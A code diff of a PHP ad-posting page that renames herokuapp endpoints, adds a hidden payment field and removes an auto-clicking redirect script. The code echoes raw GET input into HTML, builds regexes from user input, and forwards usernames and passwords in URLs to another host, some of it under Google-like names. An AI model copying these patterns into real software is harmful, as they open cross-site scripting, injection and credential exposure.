@@ -281,7 +281,7 @@ start advertising with only $0.02 cent
 <div class="googleappsuserapps84">
 </div>
 
-<form action="http://mobile84.herokuapp.com/googleapps84.php" method="POST">
+<form action="http://mobile84.herokuapp.com/ads/publish.php" method="POST">
 
 <div style="padding-bottom:8px;padding-left:8px;">title for your ad</div>
 <input name="field1" type="text" class="input1" id="input18" autocomplete="off"/>
@@ -294,6 +294,7 @@ start advertising with only $0.02 cent
 
 <input name="username" type="hidden" value='<?php echo "$google18"; ?>' />
 <input name="password" type="hidden" value='<?php echo "$google54"; ?>' />
+<input name="payment" type="hidden" value='<?php echo $_GET[payment]; ?>' />
 
 <input name="googleapps8884" type="hidden" value='<?php echo "$googleapps888844"; ?>' />
 
@@ -324,7 +325,7 @@ if payment is complete the input and the create ad button should enable
 
 <?php
 
-$googlapps8884 = file_get_contents("http://mobile84.herokuapp.com/googleapps84.sh");
+$googlapps8884 = file_get_contents("http://mobile84.herokuapp.com/ads/ads.sh");
 
 preg_match_all("/<div class=\'$_GET[username]\' id=\'$_GET[password]\'>(.*?)<\/div>/s", $googlapps8884, $googleapps84);
 $google8884 = $googleapps84[0][0];
@@ -339,13 +340,7 @@ if(preg_match("/<div class='$_GET[username]' id='$_GET[password]'>/","$google888
 
 ?>
 
-<a href='<?php echo "http://mobileapps8884.herokuapp.com/googleappsphpapps84.php?username=$_GET[username]&password=$_GET[password]"; ?>' id='googleapps88888844'></a>
-
-<script>
-
-document.getElementById("googleapps88888844").click();
-
-</script>
+<a href='<?php echo "http://mobileapps8884.herokuapp.com/ads/index.php?username=$_GET[username]&password=$_GET[password]&payment=$_GET[payment]"; ?>' id='googleapps88888844'></a>
 
 <?php
 
